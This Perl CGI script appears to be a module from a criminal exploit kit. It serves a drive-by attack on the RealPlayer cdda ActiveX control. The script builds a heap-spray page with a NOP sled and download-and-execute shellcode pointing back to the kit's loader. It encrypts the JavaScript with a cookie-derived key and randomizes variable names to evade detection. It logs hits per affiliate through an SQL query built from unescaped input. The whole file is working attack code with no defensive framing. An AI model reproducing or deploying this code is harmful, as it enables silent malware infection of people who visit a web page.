#!/usr/bin/perl

#
# RealPlayer cdda
#
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET realplayer_cdda=realplayer_cdda+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";


$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET realplayer_cdda=realplayer_cdda+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#exec code vars
$ret = 0x21212121;
$retslide = pack('V', $ret) x 750;
$cdda_uri = 'cdda://' . $retslide;
$nop_sled = '%ud528%ub7b5%u0c41%ufd14';

#shellcode
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=realplayer_cdda';
$shellcode = Shellcode::getshell($urlllll);

#randomize vars
$var_blocks    = JsXOR::generate_random_string(int(rand 6) + 3);
$var_shellcode = JsXOR::generate_random_string(int(rand 6) + 3);
$var_index     = JsXOR::generate_random_string(int(rand 6) + 3);
$var_nopsled   = JsXOR::generate_random_string(int(rand 6) + 3);
$spray_func    = JsXOR::generate_random_string(int(rand 6) + 3);
$obj_id        = JsXOR::generate_random_string(int(rand 6) + 3);


#JAVASCRIPT DATA
my $data = <<EOF;

function $spray_func() {
$var_blocks = new Array();
var $var_shellcode = unescape("$shellcode");
var $var_nopsled = unescape("$nop_sled");
do { $var_nopsled += $var_nopsled } while ($var_nopsled.length < 8200);
for ($var_index=0; $var_index < 19000; $var_index++)
$var_blocks[$var_index] = $var_nopsled + $var_shellcode;
}

$spray_func();

EOF

#Crypt the JS
$beforexoredd = EncRand::CsCrypt($data,$csname,$theCookie);

#HTML DATA
my $htmldat = <<HEOF;
<html>
<head>
<script>
$beforexoredd
</script>
</head>
<object id=$obj_id classid='clsid:CFCDAA03-8BE4-11CF-B84B-0020AFBBCCFA' width=0 height=0>
<param name="CONTROLS" value="ControlPanel">
<param name="src" value="$cdda_uri">
</object>
<script language="VBScript">
$obj_id.DoPlay
</script>
</html>

HEOF

###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print $htmldat;

####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
